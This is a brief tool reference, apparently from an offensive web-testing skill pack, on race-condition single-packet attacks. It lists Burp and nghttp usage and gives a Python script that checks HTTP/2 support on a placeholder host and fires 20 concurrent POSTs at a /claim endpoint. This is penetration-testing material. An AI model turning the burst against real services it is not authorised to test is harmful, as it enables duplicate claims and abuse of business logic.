# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`race-conditions-and-concurrency-single-packet-attack`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Turbo Intruder` | `Set engine=Engine.BURP and queue requests behind a single-packet gate` | Aligns the concurrent requests into one packet for an HTTP/2 origin | Cross-platform |
| `nghttp` | `nghttp -nv https://target.example/` | Confirm the origin negotiates HTTP/2 before choosing the single-packet engine | Linux, macOS |
| `Burp Suite Repeater` | `Group requests and choose Send group in parallel (single connection)` | Provides a quick aligned burst for small N without scripting | Cross-platform |

## Minimal Script Shape

An alignment-capability harness: it checks whether the origin negotiates HTTP/2 over ALPN and fires a small concurrent burst, reporting the negotiated protocol and status codes so single-packet feasibility is known before a full attempt.

```python
import concurrent.futures
import socket
import ssl
import urllib.request

HOST = "target.example"
ENDPOINT = f"https://{HOST}/claim"

def negotiated():
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2", "http/1.1"])
    with socket.create_connection((HOST, 443)) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as ss:
            return ss.selected_alpn_protocol()

def fire(_):
    req = urllib.request.Request(ENDPOINT, data=b"token=TESTSYNC", method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except Exception:
        return 0

alpn = negotiated()
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
    codes = list(pool.map(fire, range(20)))
print({"alpn": alpn, "single_packet_capable": alpn == "h2", "status_codes": codes})
```
